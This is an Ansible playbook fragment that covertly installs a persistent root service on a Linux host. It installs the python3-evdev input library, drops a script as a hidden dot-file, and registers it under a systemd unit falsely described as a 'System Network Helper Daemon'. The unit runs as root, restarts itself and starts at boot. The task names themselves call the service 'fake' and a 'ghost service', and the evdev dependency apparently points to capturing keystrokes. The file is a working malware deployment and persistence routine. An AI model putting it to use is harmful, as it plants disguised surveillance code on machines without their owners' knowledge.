---
- name: 1. Install python3-evdev
  ansible.builtin.apt:
    name: python3-evdev
    state: present
    update_cache: yes

- name: 2. Silently drop the raw Python script
  ansible.builtin.copy:
    src: ../system_update.py
    dest: /usr/local/bin/.system_update.py
    mode: '0755'

- name: 3. Create the fake systemd service file
  ansible.builtin.copy:
    dest: /etc/systemd/system/system-network-helper.service
    content: |
      [Unit]
      Description=System Network Helper Daemon
      After=network.target

      [Service]
      # Run the raw python script directly using the system Python
      ExecStart=/usr/bin/python3 /usr/local/bin/.system_update.py
      Restart=always
      RestartSec=30
      User=root

      [Install]
      WantedBy=multi-user.target

- name: 4. Reload systemd and start the ghost service
  ansible.builtin.systemd:
    daemon_reload: yes
    name: system-network-helper
    enabled: yes
    state: restarted